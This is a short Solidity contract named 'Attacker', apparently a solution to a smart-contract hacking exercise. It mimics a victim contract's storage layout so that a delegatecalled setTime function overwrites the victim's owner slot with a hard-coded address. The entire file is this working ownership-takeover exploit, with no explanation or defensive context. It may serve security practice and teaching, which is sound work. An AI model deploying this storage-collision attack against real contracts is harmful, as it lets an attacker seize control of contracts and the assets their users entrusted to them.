// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attacker {
    address dummy1;
    address dummy2;
    address owner;
    uint256 dummy3;

    function setTime(uint256 dummy) public {
        dummy;
        owner = 0x6fEf5e47148E965C52dAbf9086dFA41e886DD541;
    }
}
